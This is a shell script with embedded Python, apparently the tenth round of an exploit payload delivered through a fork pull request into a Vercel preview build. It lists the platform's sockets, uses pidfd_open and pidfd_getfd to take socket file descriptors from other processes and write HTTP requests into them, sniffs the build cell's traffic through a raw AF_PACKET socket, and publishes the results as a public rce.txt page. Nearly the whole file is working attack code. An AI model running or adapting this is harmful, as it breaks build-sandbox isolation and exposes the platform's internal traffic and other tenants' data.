#!/bin/sh
# Payload introduced ONLY by the fork PR. Round 10: round 9 used the wrong syscall
# number for pidfd_getfd (435 is clone3, hence EINVAL). Try the real numbers, and
# use AF_PACKET (which works with SOCK_RAW) to capture the wire the platform
# processes are talking on.
OUT=../../public
mkdir -p "$OUT"
echo '<h1>Vercel preview lab</h1><p><a href="/rce.txt">/rce.txt</a></p>' > "$OUT/index.html"
F="$OUT/rce.txt"
{
  echo "== platform sockets from /proc/net =="
  for p in tcp tcp6 udp udp6; do
    echo "-- $p"
    awk 'NR>1 {print $2, $3, $4, $5}' /proc/net/$p 2>/dev/null | head -20
  done
} > "$F" 2>&1
{
  echo "== pidfd_getfd with the right syscall numbers =="
  /uv/python/bin/python3 - <<'PYEOF' 2>&1
import os, ctypes, select
libc = ctypes.CDLL("libc.so.6", use_errno=True)
NAMES = {1:"UNIX", 2:"INET", 10:"INET6", 16:"NETLINK", 17:"PACKET", 40:"VSOCK"}

def sc(no, *args):
    return libc.syscall(ctypes.c_long(no), *[ctypes.c_long(a) for a in args])

def name(fd, peer):
    buf = ctypes.create_string_buffer(128); ln = ctypes.c_int(128)
    fn = libc.getpeername if peer else libc.getsockname
    if fn(ctypes.c_int(fd), buf, ctypes.byref(ln)) != 0: return None
    fam = ctypes.c_ushort.from_buffer(buf, 0).value
    raw = bytes(buf[:ln.value])
    d = NAMES.get(fam, "fam=%d" % fam)
    if fam == 40:
        d += " cid=%d port=%d" % (int.from_bytes(raw[8:12], "little"), int.from_bytes(raw[12:16], "little"))
    elif fam in (2, 10):
        d += " %s:%d" % (".".join(str(b) for b in raw[4:8]), int.from_bytes(raw[2:4], "big"))
    elif fam == 1:
        d += " %r" % raw[2:ln.value].split(b"\x00")[0][:60]
    return d

taken = {}
for no in (437, 438):
    pidfd = sc(434, 12, 0)
    if pidfd < 0:
        print("  pidfd_open errno %d" % ctypes.get_errno()); break
    got = sc(no, pidfd, 1, 0)
    err = ctypes.get_errno()
    print("  pidfd_getfd(%d) on pid 12 fd 1 -> %s%s" % (no, "fd %d" % got if got >= 0 else "errno %d" % err,
          " | %s" % name(got, False) if got >= 0 else ""))
    if got >= 0:
        taken[no] = got
        for pid in (1, 12, 36):
            pf = sc(434, pid, 0)
            if pf < 0: continue
            for fd in sorted(int(x) for x in os.listdir("/proc/%d/fd" % pid)):
                try:
                    if "socket" not in os.readlink("/proc/%d/fd/%d" % (pid, fd)): continue
                except Exception: continue
                g = sc(no, pf, fd, 0)
                if g < 0:
                    print("    pid %d fd %d -> errno %d" % (pid, fd, ctypes.get_errno())); continue
                print("    pid %d fd %d TAKEN as %d | self=%s peer=%s" % (pid, fd, g, name(g, False), name(g, True)))
                if g not in taken.values():
                    try:
                        os.set_blocking(g, False)
                        os.write(g, b"GET / HTTP/1.1\r\nHost: celld\r\nConnection: close\r\n\r\n")
                        r, _, _ = select.select([g], [], [], 1.0)
                        data = os.read(g, 200) if r else b"<no reply in 1s>"
                        print("      io -> %r" % data[:160])
                    except Exception as e:
                        print("      io -> %r" % e)
        break
PYEOF
} >> "$F" 2>&1
{
  echo "== AF_PACKET capture of the cell's traffic =="
  /uv/python/bin/python3 - <<'PYEOF' 2>&1
import socket, struct, time, select
s = socket.socket(17, socket.SOCK_RAW, socket.htons(0x0800))
s.settimeout(3.0)
seen = {}
n = 0
t0 = time.time()
while time.time() - t0 < 3 and n < 400:
    try:
        pkt = s.recvfrom(2048)[0]
    except Exception as e:
        print("  recv:", repr(e)[:60]); break
    n += 1
    if len(pkt) < 20: continue
    ver_ihl = pkt[0]
    if ver_ihl >> 4 != 4: continue
    proto = pkt[9]
    src = ".".join(str(b) for b in pkt[12:16])
    dst = ".".join(str(b) for b in pkt[16:20])
    sport = dport = 0
    if proto in (6, 17) and len(pkt) >= 34:
        sport, dport = struct.unpack(">HH", pkt[20:24])
    pay = pkt[20 + (20 if proto in (6, 17) else 0):]
    key = (proto, src, sport, dst, dport)
    if key not in seen:
        seen[key] = (len(pay), pay[:48])
print("  captured %d packets, %d distinct flows" % (n, len(seen)))
for (proto, src, sport, dst, dport), (ln, sample) in list(seen.items())[:25]:
    pn = {6: "TCP", 17: "UDP", 1: "ICMP"}.get(proto, str(proto))
    print("  %s %s:%s -> %s:%s  payload %d bytes %r" % (pn, src, sport, dst, dport, ln, sample[:40]))
PYEOF
} >> "$F" 2>&1
sleep 2
cat "$F"
